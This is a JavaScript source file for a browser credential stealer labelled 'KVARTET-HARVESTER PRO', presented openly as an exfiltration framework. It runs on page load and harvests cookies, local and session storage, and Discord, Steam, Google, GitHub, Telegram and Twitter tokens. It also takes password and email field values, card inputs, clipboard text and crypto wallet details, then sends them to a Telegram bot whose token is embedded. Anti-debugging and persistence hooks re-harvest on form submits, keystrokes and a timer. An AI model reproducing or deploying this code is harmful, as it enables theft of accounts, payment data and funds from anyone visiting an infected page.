
// ============================================================================
// KVARTET-HARVESTER PRO v3.0
// Advanced Web Data Exfiltration Framework
// C2: Telegram Bot Integration
// ============================================================================

(function() {
    'use strict';

    // === CONFIGURATION MODULE ===
    const CFG = {
        BOT_TOKEN: '8408696669:AAGr8AMqnKeg8uCCksm44RNpGEr_JOSCbnc',
        CHAT_ID: '878551226',
        API_BASE: 'https://api.telegram.org/bot',
        SESSION_ID: _genUUID(),
        START_TIME: Date.now(),
        MAX_RETRIES: 3,
        CHUNK_SIZE: 4096,
        EXFIL_DELAY: 1500,
        PERSIST: true,
        OBFUSCATE: true,
        ANTI_DEBUG: true
    };

    const ENDPOINTS = {
        sendDoc: `${CFG.API_BASE}${CFG.BOT_TOKEN}/sendDocument`,
        sendMsg: `${CFG.API_BASE}${CFG.BOT_TOKEN}/sendMessage`
    };

    // === UTILITY MODULE ===
    const _u = {
        uid: () => CFG.SESSION_ID,
        ts: () => new Date().toISOString(),
        now: () => Date.now(),
        enc: (s) => btoa(unescape(encodeURIComponent(s))),
        dec: (s) => decodeURIComponent(escape(atob(s))),
        chunk: (str, size) => {
            const out = [];
            for (let i = 0; i < str.length; i += size) {
                out.push(str.slice(i, i + size));
            }
            return out;
        },
        hash: (str) => {
            let h = 0;
            for (let i = 0; i < str.length; i++) {
                h = ((h << 5) - h) + str.charCodeAt(i);
                h |= 0;
            }
            return h.toString(16);
        },
        compress: (obj) => {
            try {
                return JSON.stringify(obj);
            } catch(e) {
                return String(obj);
            }
        },
        sleep: (ms) => new Promise(r => setTimeout(r, ms)),
        ip: async () => {
            const services = [
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip',
                'https://api64.ipify.org?format=json'
            ];
            for (const svc of services) {
                try {
                    const res = await fetch(svc, {mode: 'cors', cache: 'no-store'});
                    const data = await res.json();
                    return data.origin || data.ip || 'unknown';
                } catch(e) {}
            }
            return 'unknown';
        },
        geo: async () => {
            try {
                const res = await fetch('https://ipapi.co/json/', {cache: 'no-store'});
                return await res.json();
            } catch(e) {
                return null;
            }
        }
    };

    // === ANTI-DEBUG MODULE ===
    const _anti = {
        init: () => {
            if (!CFG.ANTI_DEBUG) return;

            // Detect DevTools
            const threshold = 160;
            const check = () => {
                const w = window.outerWidth - window.innerWidth > threshold;
                const h = window.outerHeight - window.innerHeight > threshold;
                if (w || h) {
                    debugger;
                    document.body.innerHTML = '';
                }
            };
            setInterval(check, 1000);

            // Detect debugger
            setInterval(() => {
                const start = performance.now();
                debugger;
                if (performance.now() - start > 100) {
                    document.body.innerHTML = '';
                }
            }, 2000);

            // Override console
            const noop = () => {};
            ['log', 'warn', 'error', 'info', 'debug'].forEach(m => {
                console[m] = noop;
            });
        }
    };

    // === FINGERPRINT MODULE ===
    const _fp = {
        collect: () => {
            const nav = navigator;
            const scr = window.screen;
            const perf = performance;

            return {
                session: CFG.SESSION_ID,
                timestamp: _u.ts(),
                url: location.href,
                domain: document.domain,
                title: document.title,
                referrer: document.referrer,
                userAgent: nav.userAgent,
                platform: nav.platform,
                vendor: nav.vendor,
                language: nav.language,
                languages: nav.languages,
                cookieEnabled: nav.cookieEnabled,
                onLine: nav.onLine,
                hardwareConcurrency: nav.hardwareConcurrency,
                deviceMemory: nav.deviceMemory,
                maxTouchPoints: nav.maxTouchPoints,
                pdfViewerEnabled: nav.pdfViewerEnabled,
                webdriver: nav.webdriver,
                bluetooth: !!nav.bluetooth,
                usb: !!nav.usb,
                credentials: !!nav.credentials,
                keyboard: !!nav.keyboard,
                mediaDevices: !!nav.mediaDevices,
                permissions: !!nav.permissions,
                presentation: !!nav.presentation,
                storage: !!nav.storage,
                wakeLock: !!nav.wakeLock,
                screen: {
                    width: scr.width,
                    height: scr.height,
                    availWidth: scr.availWidth,
                    availHeight: scr.availHeight,
                    colorDepth: scr.colorDepth,
                    pixelDepth: scr.pixelDepth,
                    orientation: scr.orientation ? {
                        angle: scr.orientation.angle,
                        type: scr.orientation.type
                    } : null
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    devicePixelRatio: window.devicePixelRatio,
                    length: window.length
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                performance: perf.memory ? {
                    usedJSHeapSize: perf.memory.usedJSHeapSize,
                    totalJSHeapSize: perf.memory.totalJSHeapSize,
                    jsHeapSizeLimit: perf.memory.jsHeapSizeLimit
                } : null,
                plugins: Array.from(nav.plugins).map(p => ({
                    name: p.name,
                    filename: p.filename,
                    description: p.description,
                    version: p.version
                })),
                mimeTypes: Array.from(nav.mimeTypes).map(m => ({
                    type: m.type,
                    description: m.description,
                    suffixes: m.suffixes
                })),
                fonts: (() => {
                    const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 
                        'Helvetica', 'Impact', 'Comic Sans MS', 'Webdings', 'Wingdings'];
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    const detected = [];
                    fonts.forEach(f => {
                        ctx.font = `72px "${f}", monospace`;
                        const w = ctx.measureText('mmmmmmmmmmlli').width;
                        ctx.font = '72px monospace';
                        const w2 = ctx.measureText('mmmmmmmmmmlli').width;
                        if (w !== w2) detected.push(f);
                    });
                    return detected;
                })()
            };
        }
    };

    // === COOKIE MODULE ===
    const _cookies = {
        all: () => {
            const raw = document.cookie;
            if (!raw) return null;
            const parsed = raw.split(';').filter(Boolean).map(c => {
                const [k, ...v] = c.trim().split('=');
                return {name: k.trim(), value: v.join('=').trim()};
            });
            return {raw, parsed, count: parsed.length};
        },
        get: (name) => {
            const m = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return m ? m[2] : null;
        },
        domains: () => {
            const domains = new Set();
            document.cookie.split(';').forEach(c => {
                const parts = c.trim().split('=');
                if (parts[0].startsWith('__Host') || parts[0].startsWith('__Secure')) {
                    domains.add('secure-host');
                }
            });
            return Array.from(domains);
        }
    };

    // === STORAGE MODULE ===
    const _storage = {
        local: () => {
            const data = {};
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    data[k] = localStorage.getItem(k);
                }
            } catch(e) { data._error = e.message; }
            return Object.keys(data).length ? data : null;
        },
        session: () => {
            const data = {};
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const k = sessionStorage.key(i);
                    data[k] = sessionStorage.getItem(k);
                }
            } catch(e) { data._error = e.message; }
            return Object.keys(data).length ? data : null;
        },
        indexed: async () => {
            try {
                const dbs = await window.indexedDB.databases();
                return dbs.map(db => ({name: db.name, version: db.version}));
            } catch(e) { return null; }
        },
        cache: async () => {
            try {
                const keys = await caches.keys();
                const data = {};
                for (const key of keys) {
                    const cache = await caches.open(key);
                    const reqs = await cache.keys();
                    data[key] = reqs.map(r => r.url);
                }
                return data;
            } catch(e) { return null; }
        }
    };

    // === TOKEN EXTRACTION MODULE ===
    const _tokens = {
        discord: () => {
            const tokens = new Set();

            // Pattern matching in storage
            const pattern = /[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27}/g;

            [localStorage, sessionStorage].forEach(store => {
                try {
                    for (let i = 0; i < store.length; i++) {
                        const k = store.key(i);
                        const v = store.getItem(k);
                        if (v) {
                            const matches = v.match(pattern);
                            if (matches) matches.forEach(t => tokens.add(t));
                        }
                    }
                } catch(e) {}
            });

            // Discord-specific keys
            ['token', 'Token', 'access_token', 'refresh_token'].forEach(key => {
                [localStorage, sessionStorage].forEach(store => {
                    const v = store.getItem(key);
                    if (v && v.length > 20) tokens.add(v);
                });
            });

            // Webpack module extraction (Discord specific)
            try {
                const wp = window.webpackChunkdiscord_app;
                if (wp) {
                    wp.push([[Date.now()], {}, (req) => {
                        for (const id in req.c) {
                            const m = req.c[id].exports;
                            if (m && m.default && m.default.getToken) {
                                const t = m.default.getToken();
                                if (t) tokens.add(t);
                            }
                            if (m && m.getToken) {
                                const t = m.getToken();
                                if (t) tokens.add(t);
                            }
                        }
                    }]);
                }
            } catch(e) {}

            return Array.from(tokens);
        },

        steam: () => {
            const data = [];
            const keys = [
                'steamLoginSecure', 'steamLogin', 'steamMachineAuth',
                'steamRememberLogin', 'sessionid', 'steamCountry',
                'Steam_Language', 'webTradeEligibility', 'steamMachineAuth',
                'steamMachineAuth64', 'steamRefresh_steam', 'steamClientLogin'
            ];

            keys.forEach(key => {
                const v = localStorage.getItem(key) || _cookies.get(key);
                if (v) data.push({key, value: v});
            });

            // Scan all localStorage for steam-related
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    if (k && (k.toLowerCase().includes('steam') || 
                              k.toLowerCase().includes('webtrade') ||
                              k.toLowerCase().includes('trade'))) {
                        data.push({key: k, value: localStorage.getItem(k)});
                    }
                }
            } catch(e) {}

            return data;
        },

        telegram: () => {
            const data = {};
            const keys = [
                'tg_auth', 'telegram_auth', 'tg_user', 'telegram_user',
                'tg_session', 'telegram_session', 'tdesktop', 'tdata',
                'telegram_stored_state', 'tgme_sync', 'tgme_init'
            ];

            keys.forEach(key => {
                const v = localStorage.getItem(key) || sessionStorage.getItem(key);
                if (v) data[key] = v;
            });

            try {
                const tg = window.Telegram?.WebApp;
                if (tg) {
                    data.webAppInitData = tg.initData;
                    data.webAppInitDataUnsafe = tg.initDataUnsafe;
                    data.webAppVersion = tg.version;
                    data.webAppPlatform = tg.platform;
                    data.webAppColorScheme = tg.colorScheme;
                }
            } catch(e) {}

            return Object.keys(data).length ? data : null;
        },

        google: () => {
            const data = {};
            const keys = [
                'oauth_token', 'access_token', 'refresh_token', 'gmail_token',
                'google_auth', 'SID', 'HSID', 'SSID', 'APISID', 'SAPISID',
                'ACCOUNT_CHOOSER', 'GAPS', 'GALX', 'LSID', 'OSID',
                '1P_JAR', 'NID', 'ANID', 'AID', 'TAID'
            ];

            keys.forEach(key => {
                const v = _cookies.get(key);
                if (v) data[key] = v;
            });

            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    if (k && (k.toLowerCase().includes('google') || 
                              k.toLowerCase().includes('gmail') ||
                              k.toLowerCase().includes('oauth') ||
                              k.toLowerCase().includes('auth'))) {
                        data[k] = localStorage.getItem(k);
                    }
                }
            } catch(e) {}

            return Object.keys(data).length ? data : null;
        },

        github: () => {
            const data = {};
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    if (k && (k.includes('github') || k.includes('gh_'))) {
                        data[k] = localStorage.getItem(k);
                    }
                }
            } catch(e) {}
            return Object.keys(data).length ? data : null;
        },

        twitter: () => {
            const data = {};
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    if (k && (k.includes('twitter') || k.includes('tw_'))) {
                        data[k] = localStorage.getItem(k);
                    }
                }
            } catch(e) {}
            return Object.keys(data).length ? data : null;
        }
    };

    // === CRYPTO WALLET MODULE ===
    const _wallets = {
        scan: () => {
            const wallets = {};

            // MetaMask / Ethereum
            try {
                if (window.ethereum) {
                    wallets.metamask = {
                        detected: true,
                        isMetaMask: window.ethereum.isMetaMask,
                        selectedAddress: window.ethereum.selectedAddress,
                        chainId: window.ethereum.chainId,
                        networkVersion: window.ethereum.networkVersion,
                        _metamask: window.ethereum._metamask ? Object.keys(window.ethereum._metamask) : null
                    };
                }
            } catch(e) {}

            // Phantom (Solana)
            try {
                if (window.solana) {
                    wallets.phantom = {
                        detected: true,
                        isPhantom: window.solana.isPhantom,
                        publicKey: window.solana.publicKey?.toString(),
                        connected: window.solana.isConnected
                    };
                }
            } catch(e) {}

            // Other providers
            const providers = [
                'binanceChain', 'coinbaseWalletExtension', 'trustwallet',
                'walletConnect', 'tronWeb', 'keplr', 'cosmostation',
                'okxwallet', 'bitkeep', 'tokenpocket', 'mathwallet',
                'fortmatic', 'portis', 'authereum', 'torus',
                'walletLink', 'web3', 'Web3Modal', 'Bitski'
            ];

            providers.forEach(p => {
                try {
                    if (window[p]) {
                        const w = window[p];
                        wallets[p] = {
                            detected: true,
                            ...(w.selectedAddress && {address: w.selectedAddress}),
                            ...(w.chainId && {chainId: w.chainId}),
                            ...(w.publicKey && {publicKey: w.publicKey.toString?.()}),
                            ...(w.isConnected && {connected: w.isConnected})
                        };
                    }
                } catch(e) {}
            });

            // Web3 provider scan
            try {
                if (window.web3?.currentProvider) {
                    wallets.web3_currentProvider = {
                        constructorName: window.web3.currentProvider.constructor?.name,
                        isMetaMask: window.web3.currentProvider.isMetaMask,
                        isTrust: window.web3.currentProvider.isTrust
                    };
                }
            } catch(e) {}

            return Object.keys(wallets).length ? wallets : null;
        }
    };

    // === CREDENTIAL HARVEST MODULE ===
    const _creds = {
        forms: () => {
            const forms = [];
            document.querySelectorAll('form').forEach((form, idx) => {
                const inputs = [];
                form.querySelectorAll('input, select, textarea').forEach(input => {
                    const type = (input.type || 'text').toLowerCase();
                    if (['text', 'email', 'password', 'tel', 'hidden', 'url'].includes(type)) {
                        inputs.push({
                            type: type,
                            name: input.name,
                            id: input.id,
                            value: input.value,
                            placeholder: input.placeholder,
                            autocomplete: input.autocomplete,
                            pattern: input.pattern,
                            required: input.required
                        });
                    }
                });
                if (inputs.length) {
                    forms.push({
                        index: idx,
                        action: form.action,
                        method: form.method,
                        name: form.name,
                        id: form.id,
                        inputs: inputs
                    });
                }
            });
            return forms.length ? forms : null;
        },

        standalone: () => {
            const inputs = [];
            const selectors = [
                'input[type="email"]',
                'input[type="password"]',
                'input[name*="email" i]',
                'input[name*="login" i]',
                'input[name*="user" i]',
                'input[name*="pass" i]',
                'input[id*="email" i]',
                'input[id*="login" i]',
                'input[autocomplete="username"]',
                'input[autocomplete="current-password"]',
                'input[autocomplete="new-password"]'
            ];

            selectors.forEach(sel => {
                document.querySelectorAll(sel).forEach(input => {
                    if (!input.closest('form')) {
                        inputs.push({
                            type: input.type,
                            name: input.name,
                            id: input.id,
                            value: input.value,
                            placeholder: input.placeholder,
                            autocomplete: input.autocomplete
                        });
                    }
                });
            });

            return inputs.length ? inputs : null;
        },

        creditCards: () => {
            const cards = [];
            const selectors = [
                'input[name*="card" i]',
                'input[name*="cc" i]',
                'input[name*="credit" i]',
                'input[name*="cvv" i]',
                'input[name*="cvc" i]',
                'input[autocomplete="cc-number"]',
                'input[autocomplete="cc-exp"]',
                'input[autocomplete="cc-csc"]'
            ];

            selectors.forEach(sel => {
                document.querySelectorAll(sel).forEach(input => {
                    cards.push({
                        type: input.type,
                        name: input.name,
                        id: input.id,
                        value: input.value,
                        placeholder: input.placeholder
                    });
                });
            });

            return cards.length ? cards : null;
        }
    };

    // === DOCUMENT ANALYSIS MODULE ===
    const _doc = {
        analyze: () => {
            return {
                title: document.title,
                url: document.URL,
                domain: document.domain,
                referrer: document.referrer,
                lastModified: document.lastModified,
                readyState: document.readyState,
                characterSet: document.characterSet,
                inputEncoding: document.inputEncoding,
                compatMode: document.compatMode,
                doctype: document.doctype?.name,
                documentElement: document.documentElement?.tagName,
                scripts: Array.from(document.scripts).map(s => s.src).filter(Boolean),
                stylesheets: Array.from(document.styleSheets).map(s => s.href).filter(Boolean),
                images: Array.from(document.images).map(i => i.src).filter(s => s.startsWith('http')),
                links: Array.from(document.links).map(a => a.href).filter(h => h.startsWith('http')),
                forms: Array.from(document.forms).map(f => ({
                    action: f.action,
                    method: f.method,
                    name: f.name,
                    enctype: f.enctype
                })),
                meta: Array.from(document.getElementsByTagName('meta')).map(m => ({
                    name: m.name || m.getAttribute('property') || m.getAttribute('http-equiv'),
                    content: m.content
                })).filter(m => m.name && m.content),
                inputs: Array.from(document.querySelectorAll('input')).map(i => ({
                    type: i.type,
                    name: i.name,
                    id: i.id
                })),
                iframes: Array.from(document.querySelectorAll('iframe')).map(f => f.src).filter(Boolean),
                canvas: Array.from(document.querySelectorAll('canvas')).length,
                webgl: !!document.createElement('canvas').getContext('webgl')
            };
        }
    };

    // === NETWORK INFO MODULE ===
    const _net = {
        info: () => {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                onLine: navigator.onLine,
                connection: conn ? {
                    effectiveType: conn.effectiveType,
                    downlink: conn.downlink,
                    rtt: conn.rtt,
                    saveData: conn.saveData,
                    type: conn.type
                } : null,
                performance: performance.getEntriesByType ? {
                    navigation: performance.getEntriesByType('navigation').map(e => ({
                        name: e.name,
                        type: e.type,
                        duration: e.duration,
                        startTime: e.startTime
                    }))
                } : null
            };
        }
    };

    // === HISTORY MODULE ===
    const _hist = {
        collect: () => {
            return {
                length: history.length,
                current: location.href,
                entries: (() => {
                    const entries = [];
                    try {
                        // Try to get history through session storage or other means
                        for (let i = 0; i < Math.min(history.length, 50); i++) {
                            entries.push(`entry_${i}`);
                        }
                    } catch(e) {}
                    return entries;
                })()
            };
        }
    };

    // === CLIPBOARD MODULE ===
    const _clip = {
        read: async () => {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    return text;
                }
            } catch(e) {}
            return null;
        }
    };

    // === MAIN HARVEST ===
    const harvest = async () => {
        const [ip, geo] = await Promise.all([_u.ip(), _u.geo()]);

        const payload = {
            meta: {
                session_id: CFG.SESSION_ID,
                timestamp: _u.ts(),
                url: location.href,
                domain: document.domain,
                title: document.title,
                ip: ip,
                geo: geo
            },
            fingerprint: _fp.collect(),
            cookies: _cookies.all(),
            storage: {
                local: _storage.local(),
                session: _storage.session(),
                indexed: await _storage.indexed(),
                cache: await _storage.cache()
            },
            tokens: {
                discord: _tokens.discord(),
                steam: _tokens.steam(),
                telegram: _tokens.telegram(),
                google: _tokens.google(),
                github: _tokens.github(),
                twitter: _tokens.twitter()
            },
            wallets: _wallets.scan(),
            credentials: {
                forms: _creds.forms(),
                standalone: _creds.standalone(),
                creditCards: _creds.creditCards()
            },
            document: _doc.analyze(),
            network: _net.info(),
            history: _hist.collect(),
            clipboard: await _clip.read()
        };

        return payload;
    };

    // === EXFILTRATION MODULE ===
    const _exfil = {
        telegram: async (data) => {
            const jsonStr = JSON.stringify(data, null, 2);
            const blob = new Blob([jsonStr], {type: 'text/plain'});
            const filename = `harvest_${CFG.SESSION_ID}_${Date.now()}.txt`;
            const file = new File([blob], filename, {type: 'text/plain'});

            const caption = [
                `Target: ${data.meta.url}`,
                `IP: ${data.meta.ip}`,
                `Session: ${CFG.SESSION_ID}`,
                `Time: ${data.meta.timestamp}`,
                `Cookies: ${data.cookies ? data.cookies.count : 0}`,
                `Discord: ${data.tokens.discord ? data.tokens.discord.length : 0}`,
                `Steam: ${data.tokens.steam ? data.tokens.steam.length : 0}`,
                `Wallets: ${data.wallets ? Object.keys(data.wallets).length : 0}`,
                `Google: ${data.tokens.google ? 'Yes' : 'No'}`,
                `Forms: ${data.credentials.forms ? data.credentials.forms.length : 0}`
            ].join('\n');

            const formData = new FormData();
            formData.append('chat_id', CFG.CHAT_ID);
            formData.append('document', file);
            formData.append('caption', caption);

            const response = await fetch(ENDPOINTS.sendDoc, {
                method: 'POST',
                body: formData,
                mode: 'cors',
                credentials: 'omit'
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }

            return response.json();
        },

        fallback: (data) => {
            // Beacon fallback
            if (navigator.sendBeacon) {
                const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                navigator.sendBeacon(ENDPOINTS.sendDoc, blob);
            }

            // Image pixel fallback
            const img = new Image();
            img.src = `${ENDPOINTS.sendMsg}?chat_id=${CFG.CHAT_ID}&text=${encodeURIComponent('Fallback: ' + CFG.SESSION_ID)}`;
        },

        chunkSend: async (data) => {
            const str = JSON.stringify(data);
            if (str.length <= CFG.CHUNK_SIZE) {
                return await _exfil.telegram(data);
            }

            // Split into chunks if too large
            const chunks = _u.chunk(str, CFG.CHUNK_SIZE);
            for (let i = 0; i < chunks.length; i++) {
                const chunkData = {
                    meta: data.meta,
                    chunk: {
                        index: i,
                        total: chunks.length,
                        data: chunks[i]
                    }
                };
                await _u.sleep(500);
                await _exfil.telegram(chunkData);
            }
        }
    };

    // === PERSISTENCE MODULE ===
    const _persist = {
        init: () => {
            if (!CFG.PERSIST) return;

            // MutationObserver for dynamic content
            const observer = new MutationObserver((mutations) => {
                let shouldHarvest = false;
                mutations.forEach(m => {
                    if (m.type === 'childList' && m.addedNodes.length) {
                        m.addedNodes.forEach(node => {
                            if (node.nodeType === 1) {
                                if (node.matches('input, form') || node.querySelector('input, form')) {
                                    shouldHarvest = true;
                                }
                            }
                        });
                    }
                });

                if (shouldHarvest) {
                    setTimeout(() => {
                        harvest().then(d => _exfil.telegram(d)).catch(() => {});
                    }, 2000);
                }
            });

            if (document.body) {
                observer.observe(document.body, {childList: true, subtree: true});
            }

            // Form submission interception
            document.addEventListener('submit', (e) => {
                setTimeout(() => {
                    harvest().then(d => _exfil.telegram(d)).catch(() => {});
                }, 100);
            }, true);

            // Input change interception
            let inputTimeout;
            document.addEventListener('input', (e) => {
                clearTimeout(inputTimeout);
                inputTimeout = setTimeout(() => {
                    if (e.target.type === 'password' || e.target.type === 'email') {
                        harvest().then(d => _exfil.telegram(d)).catch(() => {});
                    }
                }, 3000);
            }, true);

            // Before unload
            window.addEventListener('beforeunload', () => {
                const data = {meta: {session_id: CFG.SESSION_ID, timestamp: _u.ts(), event: 'unload'}};
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(ENDPOINTS.sendDoc, new Blob([JSON.stringify(data)]));
                }
            });

            // Periodic re-harvest
            setInterval(() => {
                harvest().then(d => _exfil.telegram(d)).catch(() => {});
            }, 300000); // Every 5 minutes
        }
    };

    // === UUID GENERATOR ===
    function _genUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
            const r = Math.random() * 16 | 0;
            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
    }

    // === MAIN EXECUTION ===
    const main = async () => {
        await _u.sleep(CFG.EXFIL_DELAY);
        _anti.init();

        try {
            const data = await harvest();
            await _exfil.telegram(data);
            _persist.init();
        } catch (error) {
            try {
                const data = await harvest();
                _exfil.fallback(data);
            } catch(e) {}
        }
    };

    // Entry points
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', main);
    } else {
        main();
    }

    // Expose for manual trigger
    window.__harvest = main;
    window.__harvestData = harvest;

})();
